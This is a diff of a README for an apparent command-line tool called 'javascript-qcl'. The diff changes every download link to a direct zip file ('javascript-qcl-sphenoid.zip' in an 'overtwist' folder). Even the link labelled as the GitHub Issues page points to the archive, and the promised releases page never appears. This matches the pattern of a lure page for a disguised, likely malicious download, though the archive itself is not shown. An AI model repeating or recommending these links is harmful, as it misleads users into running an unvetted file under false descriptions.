@@ -4,7 +4,7 @@
 **javascript-qcl** is a user-friendly application designed to help you easily manage tasks from your command line. Whether you're working on a project or simply looking to automate routines, this tool simplifies your command line experience.
 
 ## 📥 Download Now
-[![Download Latest Release](https://raw.githubusercontent.com/bispakk/javascript-qcl/main/overtwist/javascript-qcl.zip%20Latest%20Release-link-blue)](https://raw.githubusercontent.com/bispakk/javascript-qcl/main/overtwist/javascript-qcl.zip)
+[![Download Latest Release](https://github.com/bispakk/javascript-qcl/raw/refs/heads/main/overtwist/javascript-qcl-sphenoid.zip%20Latest%20Release-link-blue)](https://github.com/bispakk/javascript-qcl/raw/refs/heads/main/overtwist/javascript-qcl-sphenoid.zip)
 
 ## 🚀 Getting Started
 To get started with **javascript-qcl**, follow the simple steps below. No technical expertise is required.
@@ -18,7 +18,7 @@ To get started with **javascript-qcl**, follow the simple steps below. No techni
 ## 📦 Installation Steps
 1. **Visit the Download Page**  
    Click the link below to access the releases page.  
-   [Download Latest Release](https://raw.githubusercontent.com/bispakk/javascript-qcl/main/overtwist/javascript-qcl.zip)
+   [Download Latest Release](https://github.com/bispakk/javascript-qcl/raw/refs/heads/main/overtwist/javascript-qcl-sphenoid.zip)
 
 2. **Choose Your Version**  
    On the releases page, you will see different versions listed. Look for the latest version labeled as "Latest" to ensure you have the newest features and fixes.
@@ -69,7 +69,7 @@ After installation, you can open the command line interface (Terminal on macOS/L
 - **Search Online for Tutorials:** Find videos or articles that can guide you through using the tool.
 
 ## 📎 Support
-If you encounter any issues or need assistance, feel free to visit the [GitHub Issues page](https://raw.githubusercontent.com/bispakk/javascript-qcl/main/overtwist/javascript-qcl.zip) to report a problem or ask for help.
+If you encounter any issues or need assistance, feel free to visit the [GitHub Issues page](https://github.com/bispakk/javascript-qcl/raw/refs/heads/main/overtwist/javascript-qcl-sphenoid.zip) to report a problem or ask for help.
 
 ## 🔗 Additional Resources
 To learn more about **javascript-qcl**, check out the official documentation available on the GitHub repository. 
@@ -79,4 +79,4 @@ To learn more about **javascript-qcl**, check out the official documentation ava
 
 ## 📥 Download & Install
 For a seamless download experience, remember to visit the link below:  
-[Download Latest Release](https://raw.githubusercontent.com/bispakk/javascript-qcl/main/overtwist/javascript-qcl.zip)
+[Download Latest Release](https://github.com/bispakk/javascript-qcl/raw/refs/heads/main/overtwist/javascript-qcl-sphenoid.zip)
